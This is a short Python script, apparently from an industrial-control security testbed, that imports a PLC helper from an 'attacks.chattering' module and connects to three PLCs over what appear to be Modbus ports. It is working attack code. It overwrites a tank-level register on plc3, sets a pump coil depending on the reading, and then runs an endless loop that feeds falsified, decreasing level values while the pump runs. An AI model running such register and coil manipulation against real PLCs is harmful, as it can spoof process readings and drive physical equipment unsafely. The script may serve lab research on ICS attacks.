from attacks.chattering import Plc
import time

plc1 = Plc("plc1", "0.0.0.0", 5023, None)
plc2 = Plc("plc2", "0.0.0.0", 5021, None)
plc3 = Plc("plc3", "0.0.0.0", 5022, None)

interval = 1

plc3.client.write_register(1024, 150)

poll3 = plc3.poll_data()
print(poll3)
if int(poll3["level_plc3"]) > 10:
    plc3.client.write_coil(0, True)
else:
    plc3.client.write_coil(0, False)

while True:
    poll3 = plc3.poll_data()
    print(poll3)

    if poll3["pump_plc3"]:
        plc3.client.write_register(1024, int(poll3["level_plc3"] - 1))

    time.sleep(interval)
